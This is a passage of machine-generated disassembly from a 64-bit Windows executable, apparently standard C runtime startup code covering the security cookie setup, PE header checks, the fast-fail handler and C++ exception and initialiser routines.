   140001ebc:	e8 67 0c 00 00       	call   0x140002b28
   140001ec1:	84 c0                	test   %al,%al
   140001ec3:	75 04                	jne    0x140001ec9
   140001ec5:	32 c0                	xor    %al,%al
   140001ec7:	eb 14                	jmp    0x140001edd
   140001ec9:	e8 2a 70 00 00       	call   0x140008ef8
   140001ece:	84 c0                	test   %al,%al
   140001ed0:	75 09                	jne    0x140001edb
   140001ed2:	33 c9                	xor    %ecx,%ecx
   140001ed4:	e8 77 0c 00 00       	call   0x140002b50
   140001ed9:	eb ea                	jmp    0x140001ec5
   140001edb:	b0 01                	mov    $0x1,%al
   140001edd:	48 83 c4 28          	add    $0x28,%rsp
   140001ee1:	c3                   	ret
   140001ee2:	cc                   	int3
   140001ee3:	cc                   	int3
   140001ee4:	40 53                	rex push %rbx
   140001ee6:	48 83 ec 20          	sub    $0x20,%rsp
   140001eea:	80 3d a0 01 02 00 00 	cmpb   $0x0,0x201a0(%rip)        # 0x140022091
   140001ef1:	8b d9                	mov    %ecx,%ebx
   140001ef3:	75 67                	jne    0x140001f5c
   140001ef5:	83 f9 01             	cmp    $0x1,%ecx
   140001ef8:	77 6a                	ja     0x140001f64
   140001efa:	e8 d5 09 00 00       	call   0x1400028d4
   140001eff:	85 c0                	test   %eax,%eax
   140001f01:	74 28                	je     0x140001f2b
   140001f03:	85 db                	test   %ebx,%ebx
   140001f05:	75 24                	jne    0x140001f2b
   140001f07:	48 8d 0d 8a 01 02 00 	lea    0x2018a(%rip),%rcx        # 0x140022098
   140001f0e:	e8 49 6e 00 00       	call   0x140008d5c
   140001f13:	85 c0                	test   %eax,%eax
   140001f15:	75 10                	jne    0x140001f27
   140001f17:	48 8d 0d 92 01 02 00 	lea    0x20192(%rip),%rcx        # 0x1400220b0
   140001f1e:	e8 39 6e 00 00       	call   0x140008d5c
   140001f23:	85 c0                	test   %eax,%eax
   140001f25:	74 2e                	je     0x140001f55
   140001f27:	32 c0                	xor    %al,%al
   140001f29:	eb 33                	jmp    0x140001f5e
   140001f2b:	66 0f 6f 05 ad 38 01 	movdqa 0x138ad(%rip),%xmm0        # 0x1400157e0
   140001f32:	00 
   140001f33:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001f37:	f3 0f 7f 05 59 01 02 	movdqu %xmm0,0x20159(%rip)        # 0x140022098
   140001f3e:	00 
   140001f3f:	48 89 05 62 01 02 00 	mov    %rax,0x20162(%rip)        # 0x1400220a8
   140001f46:	f3 0f 7f 05 62 01 02 	movdqu %xmm0,0x20162(%rip)        # 0x1400220b0
   140001f4d:	00 
   140001f4e:	48 89 05 6b 01 02 00 	mov    %rax,0x2016b(%rip)        # 0x1400220c0
   140001f55:	c6 05 35 01 02 00 01 	movb   $0x1,0x20135(%rip)        # 0x140022091
   140001f5c:	b0 01                	mov    $0x1,%al
   140001f5e:	48 83 c4 20          	add    $0x20,%rsp
   140001f62:	5b                   	pop    %rbx
   140001f63:	c3                   	ret
   140001f64:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001f69:	e8 5e 02 00 00       	call   0x1400021cc
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	48 83 ec 18          	sub    $0x18,%rsp
   140001f74:	4c 8b c1             	mov    %rcx,%r8
   140001f77:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001f7c:	66 39 05 7d e0 ff ff 	cmp    %ax,-0x1f83(%rip)        # 0x140000000
   140001f83:	75 78                	jne    0x140001ffd
   140001f85:	48 63 0d b0 e0 ff ff 	movslq -0x1f50(%rip),%rcx        # 0x14000003c
   140001f8c:	48 8d 15 6d e0 ff ff 	lea    -0x1f93(%rip),%rdx        # 0x140000000
   140001f93:	48 03 ca             	add    %rdx,%rcx
   140001f96:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001f9c:	75 5f                	jne    0x140001ffd
   140001f9e:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140001fa3:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001fa7:	75 54                	jne    0x140001ffd
   140001fa9:	4c 2b c2             	sub    %rdx,%r8
   140001fac:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140001fb0:	48 83 c2 18          	add    $0x18,%rdx
   140001fb4:	48 03 d1             	add    %rcx,%rdx
   140001fb7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140001fbb:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140001fbf:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140001fc3:	48 89 14 24          	mov    %rdx,(%rsp)
   140001fc7:	49 3b d1             	cmp    %r9,%rdx
   140001fca:	74 18                	je     0x140001fe4
   140001fcc:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140001fcf:	4c 3b c1             	cmp    %rcx,%r8
   140001fd2:	72 0a                	jb     0x140001fde
   140001fd4:	8b 42 08             	mov    0x8(%rdx),%eax
   140001fd7:	03 c1                	add    %ecx,%eax
   140001fd9:	4c 3b c0             	cmp    %rax,%r8
   140001fdc:	72 08                	jb     0x140001fe6
   140001fde:	48 83 c2 28          	add    $0x28,%rdx
   140001fe2:	eb df                	jmp    0x140001fc3
   140001fe4:	33 d2                	xor    %edx,%edx
   140001fe6:	48 85 d2             	test   %rdx,%rdx
   140001fe9:	75 04                	jne    0x140001fef
   140001feb:	32 c0                	xor    %al,%al
   140001fed:	eb 14                	jmp    0x140002003
   140001fef:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140001ff3:	7d 04                	jge    0x140001ff9
   140001ff5:	32 c0                	xor    %al,%al
   140001ff7:	eb 0a                	jmp    0x140002003
   140001ff9:	b0 01                	mov    $0x1,%al
   140001ffb:	eb 06                	jmp    0x140002003
   140001ffd:	32 c0                	xor    %al,%al
   140001fff:	eb 02                	jmp    0x140002003
   140002001:	32 c0                	xor    %al,%al
   140002003:	48 83 c4 18          	add    $0x18,%rsp
   140002007:	c3                   	ret
   140002008:	40 53                	rex push %rbx
   14000200a:	48 83 ec 20          	sub    $0x20,%rsp
   14000200e:	8a d9                	mov    %cl,%bl
   140002010:	e8 bf 08 00 00       	call   0x1400028d4
   140002015:	33 d2                	xor    %edx,%edx
   140002017:	85 c0                	test   %eax,%eax
   140002019:	74 0b                	je     0x140002026
   14000201b:	84 db                	test   %bl,%bl
   14000201d:	75 07                	jne    0x140002026
   14000201f:	48 87 15 62 00 02 00 	xchg   %rdx,0x20062(%rip)        # 0x140022088
   140002026:	48 83 c4 20          	add    $0x20,%rsp
   14000202a:	5b                   	pop    %rbx
   14000202b:	c3                   	ret
   14000202c:	40 53                	rex push %rbx
   14000202e:	48 83 ec 20          	sub    $0x20,%rsp
   140002032:	80 3d 57 00 02 00 00 	cmpb   $0x0,0x20057(%rip)        # 0x140022090
   140002039:	8a d9                	mov    %cl,%bl
   14000203b:	74 04                	je     0x140002041
   14000203d:	84 d2                	test   %dl,%dl
   14000203f:	75 0c                	jne    0x14000204d
   140002041:	e8 c6 6e 00 00       	call   0x140008f0c
   140002046:	8a cb                	mov    %bl,%cl
   140002048:	e8 03 0b 00 00       	call   0x140002b50
   14000204d:	b0 01                	mov    $0x1,%al
   14000204f:	48 83 c4 20          	add    $0x20,%rsp
   140002053:	5b                   	pop    %rbx
   140002054:	c3                   	ret
   140002055:	cc                   	int3
   140002056:	cc                   	int3
   140002057:	cc                   	int3
   140002058:	40 53                	rex push %rbx
   14000205a:	48 83 ec 20          	sub    $0x20,%rsp
   14000205e:	48 83 3d 32 00 02 00 	cmpq   $0xffffffffffffffff,0x20032(%rip)        # 0x140022098
   140002065:	ff 
   140002066:	48 8b d9             	mov    %rcx,%rbx
   140002069:	75 07                	jne    0x140002072
   14000206b:	e8 98 6c 00 00       	call   0x140008d08
   140002070:	eb 0f                	jmp    0x140002081
   140002072:	48 8b d3             	mov    %rbx,%rdx
   140002075:	48 8d 0d 1c 00 02 00 	lea    0x2001c(%rip),%rcx        # 0x140022098
   14000207c:	e8 03 6d 00 00       	call   0x140008d84
   140002081:	33 d2                	xor    %edx,%edx
   140002083:	85 c0                	test   %eax,%eax
   140002085:	48 0f 44 d3          	cmove  %rbx,%rdx
   140002089:	48 8b c2             	mov    %rdx,%rax
   14000208c:	48 83 c4 20          	add    $0x20,%rsp
   140002090:	5b                   	pop    %rbx
   140002091:	c3                   	ret
   140002092:	cc                   	int3
   140002093:	cc                   	int3
   140002094:	48 83 ec 28          	sub    $0x28,%rsp
   140002098:	e8 bb ff ff ff       	call   0x140002058
   14000209d:	48 f7 d8             	neg    %rax
   1400020a0:	1b c0                	sbb    %eax,%eax
   1400020a2:	f7 d8                	neg    %eax
   1400020a4:	ff c8                	dec    %eax
   1400020a6:	48 83 c4 28          	add    $0x28,%rsp
   1400020aa:	c3                   	ret
   1400020ab:	cc                   	int3
   1400020ac:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400020b1:	55                   	push   %rbp
   1400020b2:	48 8b ec             	mov    %rsp,%rbp
   1400020b5:	48 83 ec 30          	sub    $0x30,%rsp
   1400020b9:	48 8b 05 40 ef 01 00 	mov    0x1ef40(%rip),%rax        # 0x140021000
   1400020c0:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400020c7:	2b 00 00 
   1400020ca:	48 3b c3             	cmp    %rbx,%rax
   1400020cd:	75 77                	jne    0x140002146
   1400020cf:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400020d3:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   1400020da:	00 
   1400020db:	ff 15 37 30 01 00    	call   *0x13037(%rip)        # 0x140015118
   1400020e1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400020e5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400020e9:	ff 15 21 30 01 00    	call   *0x13021(%rip)        # 0x140015110
   1400020ef:	8b c0                	mov    %eax,%eax
   1400020f1:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400020f5:	ff 15 0d 30 01 00    	call   *0x1300d(%rip)        # 0x140015108
   1400020fb:	8b c0                	mov    %eax,%eax
   1400020fd:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140002101:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140002105:	ff 15 f5 2f 01 00    	call   *0x12ff5(%rip)        # 0x140015100
   14000210b:	8b 45 18             	mov    0x18(%rbp),%eax
   14000210e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002112:	48 c1 e0 20          	shl    $0x20,%rax
   140002116:	48 33 45 18          	xor    0x18(%rbp),%rax
   14000211a:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000211e:	48 33 c1             	xor    %rcx,%rax
   140002121:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140002128:	ff 00 00 
   14000212b:	48 23 c1             	and    %rcx,%rax
   14000212e:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140002135:	2b 00 00 
   140002138:	48 3b c3             	cmp    %rbx,%rax
   14000213b:	48 0f 44 c1          	cmove  %rcx,%rax
   14000213f:	48 89 05 ba ee 01 00 	mov    %rax,0x1eeba(%rip)        # 0x140021000
   140002146:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000214b:	48 f7 d0             	not    %rax
   14000214e:	48 89 05 eb ee 01 00 	mov    %rax,0x1eeeb(%rip)        # 0x140021040
   140002155:	48 83 c4 30          	add    $0x30,%rsp
   140002159:	5d                   	pop    %rbp
   14000215a:	c3                   	ret
   14000215b:	cc                   	int3
   14000215c:	33 c0                	xor    %eax,%eax
   14000215e:	c3                   	ret
   14000215f:	cc                   	int3
   140002160:	b8 01 00 00 00       	mov    $0x1,%eax
   140002165:	c3                   	ret
   140002166:	cc                   	int3
   140002167:	cc                   	int3
   140002168:	b8 00 40 00 00       	mov    $0x4000,%eax
   14000216d:	c3                   	ret
   14000216e:	cc                   	int3
   14000216f:	cc                   	int3
   140002170:	48 8d 0d 59 ff 01 00 	lea    0x1ff59(%rip),%rcx        # 0x1400220d0
   140002177:	48 ff 25 a2 2f 01 00 	rex.W jmp *0x12fa2(%rip)        # 0x140015120
   14000217e:	cc                   	int3
   14000217f:	cc                   	int3
   140002180:	b0 01                	mov    $0x1,%al
   140002182:	c3                   	ret
   140002183:	cc                   	int3
   140002184:	c2 00 00             	ret    $0x0
   140002187:	cc                   	int3
   140002188:	48 83 ec 28          	sub    $0x28,%rsp
   14000218c:	e8 9f f3 ff ff       	call   0x140001530
   140002191:	48 83 08 24          	orq    $0x24,(%rax)
   140002195:	e8 72 f7 ff ff       	call   0x14000190c
   14000219a:	48 83 08 02          	orq    $0x2,(%rax)
   14000219e:	48 83 c4 28          	add    $0x28,%rsp
   1400021a2:	c3                   	ret
   1400021a3:	cc                   	int3
   1400021a4:	33 c0                	xor    %eax,%eax
   1400021a6:	39 05 a0 ee 01 00    	cmp    %eax,0x1eea0(%rip)        # 0x14002104c
   1400021ac:	0f 94 c0             	sete   %al
   1400021af:	c3                   	ret
   1400021b0:	48 8d 05 f9 0a 02 00 	lea    0x20af9(%rip),%rax        # 0x140022cb0
   1400021b7:	c3                   	ret
   1400021b8:	48 8d 05 e9 0a 02 00 	lea    0x20ae9(%rip),%rax        # 0x140022ca8
   1400021bf:	c3                   	ret
   1400021c0:	c7 05 16 ff 01 00 00 	movl   $0x0,0x1ff16(%rip)        # 0x1400220e0
   1400021c7:	00 00 00 
   1400021ca:	c3                   	ret
   1400021cb:	cc                   	int3
   1400021cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400021d1:	55                   	push   %rbp
   1400021d2:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400021d9:	ff 
   1400021da:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400021e1:	8b d9                	mov    %ecx,%ebx
   1400021e3:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400021e8:	ff 15 0a 2f 01 00    	call   *0x12f0a(%rip)        # 0x1400150f8
   1400021ee:	85 c0                	test   %eax,%eax
   1400021f0:	74 04                	je     0x1400021f6
   1400021f2:	8b cb                	mov    %ebx,%ecx
   1400021f4:	cd 29                	int    $0x29
   1400021f6:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400021fb:	e8 c0 ff ff ff       	call   0x1400021c0
   140002200:	33 d2                	xor    %edx,%edx
   140002202:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002206:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000220c:	e8 bf 1b 01 00       	call   0x140013dd0
   140002211:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002215:	ff 15 a5 2e 01 00    	call   *0x12ea5(%rip)        # 0x1400150c0
   14000221b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140002222:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140002229:	48 8b cb             	mov    %rbx,%rcx
   14000222c:	45 33 c0             	xor    %r8d,%r8d
   14000222f:	ff 15 93 2e 01 00    	call   *0x12e93(%rip)        # 0x1400150c8
   140002235:	48 85 c0             	test   %rax,%rax
   140002238:	74 3f                	je     0x140002279
   14000223a:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140002241:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140002248:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000224f:	00 00 
   140002251:	4c 8b c8             	mov    %rax,%r9
   140002254:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002259:	4c 8b c3             	mov    %rbx,%r8
   14000225c:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140002263:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002268:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000226c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140002271:	33 c9                	xor    %ecx,%ecx
   140002273:	ff 15 57 2e 01 00    	call   *0x12e57(%rip)        # 0x1400150d0
   140002279:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140002280:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002285:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000228c:	33 d2                	xor    %edx,%edx
   14000228e:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140002295:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   14000229b:	48 83 c0 08          	add    $0x8,%rax
   14000229f:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400022a6:	e8 25 1b 01 00       	call   0x140013dd0
   1400022ab:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400022b2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400022b7:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400022be:	40 
   1400022bf:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1400022c6:	00 
   1400022c7:	ff 15 5b 2e 01 00    	call   *0x12e5b(%rip)        # 0x140015128
   1400022cd:	8b d8                	mov    %eax,%ebx
   1400022cf:	33 c9                	xor    %ecx,%ecx
   1400022d1:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400022d6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400022db:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400022df:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400022e4:	ff 15 f6 2d 01 00    	call   *0x12df6(%rip)        # 0x1400150e0
   1400022ea:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400022ef:	ff 15 e3 2d 01 00    	call   *0x12de3(%rip)        # 0x1400150d8
   1400022f5:	85 c0                	test   %eax,%eax
   1400022f7:	75 0d                	jne    0x140002306
   1400022f9:	83 fb 01             	cmp    $0x1,%ebx
   1400022fc:	74 08                	je     0x140002306
   1400022fe:	8d 48 03             	lea    0x3(%rax),%ecx
   140002301:	e8 ba fe ff ff       	call   0x1400021c0
   140002306:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000230d:	00 
   14000230e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140002315:	5d                   	pop    %rbp
   140002316:	c3                   	ret
   140002317:	cc                   	int3
   140002318:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000231f:	33 d2                	xor    %edx,%edx
   140002321:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002326:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000232a:	e8 a1 1a 01 00       	call   0x140013dd0
   14000232f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002334:	ff 15 f6 2d 01 00    	call   *0x12df6(%rip)        # 0x140015130
   14000233a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000233f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002344:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000234a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140002351:	c3                   	ret
   140002352:	cc                   	int3
   140002353:	cc                   	int3
   140002354:	e9 03 fe ff ff       	jmp    0x14000215c
   140002359:	cc                   	int3
   14000235a:	cc                   	int3
   14000235b:	cc                   	int3
   14000235c:	48 83 ec 28          	sub    $0x28,%rsp
   140002360:	33 c9                	xor    %ecx,%ecx
   140002362:	ff 15 d0 2d 01 00    	call   *0x12dd0(%rip)        # 0x140015138
   140002368:	48 85 c0             	test   %rax,%rax
   14000236b:	74 3a                	je     0x1400023a7
   14000236d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140002372:	66 39 08             	cmp    %cx,(%rax)
   140002375:	75 30                	jne    0x1400023a7
   140002377:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000237b:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   140002382:	75 23                	jne    0x1400023a7
   140002384:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140002389:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   14000238e:	75 17                	jne    0x1400023a7
   140002390:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   140002397:	0e 
   140002398:	76 0d                	jbe    0x1400023a7
   14000239a:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   1400023a1:	00 
   1400023a2:	0f 95 c0             	setne  %al
   1400023a5:	eb 02                	jmp    0x1400023a9
   1400023a7:	32 c0                	xor    %al,%al
   1400023a9:	48 83 c4 28          	add    $0x28,%rsp
   1400023ad:	c3                   	ret
   1400023ae:	cc                   	int3
   1400023af:	cc                   	int3
   1400023b0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400023c0
   1400023b7:	48 ff 25 22 2d 01 00 	rex.W jmp *0x12d22(%rip)        # 0x1400150e0
   1400023be:	cc                   	int3
   1400023bf:	cc                   	int3
   1400023c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400023c5:	57                   	push   %rdi
   1400023c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400023ca:	48 8b 19             	mov    (%rcx),%rbx
   1400023cd:	48 8b f9             	mov    %rcx,%rdi
   1400023d0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400023d6:	75 24                	jne    0x1400023fc
   1400023d8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400023dc:	75 1e                	jne    0x1400023fc
   1400023de:	8b 53 20             	mov    0x20(%rbx),%edx
   1400023e1:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   1400023e7:	74 20                	je     0x140002409
   1400023e9:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   1400023ef:	83 f8 01             	cmp    $0x1,%eax
   1400023f2:	76 15                	jbe    0x140002409
   1400023f4:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   1400023fa:	74 0d                	je     0x140002409
   1400023fc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002401:	33 c0                	xor    %eax,%eax
   140002403:	48 83 c4 20          	add    $0x20,%rsp
   140002407:	5f                   	pop    %rdi
   140002408:	c3                   	ret
   140002409:	e8 aa 08 00 00       	call   0x140002cb8
   14000240e:	48 89 18             	mov    %rbx,(%rax)
   140002411:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140002415:	e8 b2 08 00 00       	call   0x140002ccc
   14000241a:	48 89 18             	mov    %rbx,(%rax)
   14000241d:	e8 22 6b 00 00       	call   0x140008f44
   140002422:	cc                   	int3
   140002423:	cc                   	int3
   140002424:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002429:	57                   	push   %rdi
   14000242a:	48 83 ec 20          	sub    $0x20,%rsp
   14000242e:	48 8d 1d 7b c0 01 00 	lea    0x1c07b(%rip),%rbx        # 0x14001e4b0
   140002435:	48 8d 3d 74 c0 01 00 	lea    0x1c074(%rip),%rdi        # 0x14001e4b0
   14000243c:	eb 12                	jmp    0x140002450
   14000243e:	48 8b 03             	mov    (%rbx),%rax
   140002441:	48 85 c0             	test   %rax,%rax
   140002444:	74 06                	je     0x14000244c
   140002446:	ff 15 c4 2e 01 00    	call   *0x12ec4(%rip)        # 0x140015310
   14000244c:	48 83 c3 08          	add    $0x8,%rbx
   140002450:	48 3b df             	cmp    %rdi,%rbx
   140002453:	72 e9                	jb     0x14000243e
   140002455:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000245a:	48 83 c4 20          	add    $0x20,%rsp
   14000245e:	5f                   	pop    %rdi
   14000245f:	c3                   	ret
   140002460:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002465:	57                   	push   %rdi
   140002466:	48 83 ec 20          	sub    $0x20,%rsp
   14000246a:	48 8d 1d 4f c0 01 00 	lea    0x1c04f(%rip),%rbx        # 0x14001e4c0
   140002471:	48 8d 3d 48 c0 01 00 	lea    0x1c048(%rip),%rdi        # 0x14001e4c0
   140002478:	eb 12                	jmp    0x14000248c
   14000247a:	48 8b 03             	mov    (%rbx),%rax
   14000247d:	48 85 c0             	test   %rax,%rax
   140002480:	74 06                	je     0x140002488
   140002482:	ff 15 88 2e 01 00    	call   *0x12e88(%rip)        # 0x140015310
   140002488:	48 83 c3 08          	add    $0x8,%rbx
   14000248c:	48 3b df             	cmp    %rdi,%rbx
   14000248f:	72 e9                	jb     0x14000247a
   140002491:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002496:	48 83 c4 20          	add    $0x20,%rsp
   14000249a:	5f                   	pop    %rdi
   14000249b:	c3                   	ret
   14000249c:	40 53                	rex push %rbx
   14000249e:	48 83 ec 20          	sub    $0x20,%rsp
   1400024a2:	48 8b d9             	mov    %rcx,%rbx
   1400024a5:	48 8b c2             	mov    %rdx,%rax
   1400024a8:	48 8d 0d 49 33 01 00 	lea    0x13349(%rip),%rcx        # 0x1400157f8
   1400024af:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400024b2:	48 89 0b             	mov    %rcx,(%rbx)
   1400024b5:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400024b9:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400024bd:	0f 11 02             	movups %xmm0,(%rdx)
   1400024c0:	e8 27 08 00 00       	call   0x140002cec
   1400024c5:	48 8d 05 5c 33 01 00 	lea    0x1335c(%rip),%rax        # 0x140015828
   1400024cc:	48 89 03             	mov    %rax,(%rbx)
   1400024cf:	48 8b c3             	mov    %rbx,%rax
   1400024d2:	48 83 c4 20          	add    $0x20,%rsp
   1400024d6:	5b                   	pop    %rbx
   1400024d7:	c3                   	ret
   1400024d8:	48 8d 05 59 33 01 00 	lea    0x13359(%rip),%rax        # 0x140015838
   1400024df:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400024e6:	00 
   1400024e7:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400024eb:	48 8d 05 36 33 01 00 	lea    0x13336(%rip),%rax        # 0x140015828
   1400024f2:	48 89 01             	mov    %rax,(%rcx)
   1400024f5:	48 8b c1             	mov    %rcx,%rax
   1400024f8:	c3                   	ret
   1400024f9:	cc                   	int3
   1400024fa:	cc                   	int3
   1400024fb:	cc                   	int3
   1400024fc:	40 53                	rex push %rbx
   1400024fe:	48 83 ec 20          	sub    $0x20,%rsp
   140002502:	48 8b d9             	mov    %rcx,%rbx
   140002505:	48 8b c2             	mov    %rdx,%rax
   140002508:	48 8d 0d e9 32 01 00 	lea    0x132e9(%rip),%rcx        # 0x1400157f8
   14000250f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002512:	48 89 0b             	mov    %rcx,(%rbx)
   140002515:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002519:	48 8d 48 08          	lea    0x8(%rax),%rcx
   14000251d:	0f 11 02             	movups %xmm0,(%rdx)
   140002520:	e8 c7 07 00 00       	call   0x140002cec
   140002525:	48 8d 05 24 33 01 00 	lea    0x13324(%rip),%rax        # 0x140015850
   14000252c:	48 89 03             	mov    %rax,(%rbx)
   14000252f:	48 8b c3             	mov    %rbx,%rax
   140002532:	48 83 c4 20          	add    $0x20,%rsp
   140002536:	5b                   	pop    %rbx
   140002537:	c3                   	ret
   140002538:	48 8d 05 21 33 01 00 	lea    0x13321(%rip),%rax        # 0x140015860
   14000253f:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140002546:	00 
   140002547:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000254b:	48 8d 05 fe 32 01 00 	lea    0x132fe(%rip),%rax        # 0x140015850
   140002552:	48 89 01             	mov    %rax,(%rcx)
   140002555:	48 8b c1             	mov    %rcx,%rax
   140002558:	c3                   	ret
   140002559:	cc                   	int3
   14000255a:	cc                   	int3
   14000255b:	cc                   	int3
   14000255c:	40 53                	rex push %rbx
   14000255e:	48 83 ec 20          	sub    $0x20,%rsp
   140002562:	48 8b d9             	mov    %rcx,%rbx
   140002565:	48 8b c2             	mov    %rdx,%rax
   140002568:	48 8d 0d 89 32 01 00 	lea    0x13289(%rip),%rcx        # 0x1400157f8
   14000256f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002572:	48 89 0b             	mov    %rcx,(%rbx)
   140002575:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002579:	48 8d 48 08          	lea    0x8(%rax),%rcx
   14000257d:	0f 11 02             	movups %xmm0,(%rdx)
   140002580:	e8 67 07 00 00       	call   0x140002cec
   140002585:	48 8b c3             	mov    %rbx,%rax
   140002588:	48 83 c4 20          	add    $0x20,%rsp
   14000258c:	5b                   	pop    %rbx
   14000258d:	c3                   	ret
   14000258e:	cc                   	int3
   14000258f:	cc                   	int3
   140002590:	48 8d 05 61 32 01 00 	lea    0x13261(%rip),%rax        # 0x1400157f8
   140002597:	48 89 01             	mov    %rax,(%rcx)
   14000259a:	48 83 c1 08          	add    $0x8,%rcx
   14000259e:	e9 c9 07 00 00       	jmp    0x140002d6c
   1400025a3:	cc                   	int3
   1400025a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400025a9:	57                   	push   %rdi
   1400025aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400025ae:	48 8d 05 43 32 01 00 	lea    0x13243(%rip),%rax        # 0x1400157f8
   1400025b5:	48 8b f9             	mov    %rcx,%rdi
   1400025b8:	48 89 01             	mov    %rax,(%rcx)
   1400025bb:	8b da                	mov    %edx,%ebx
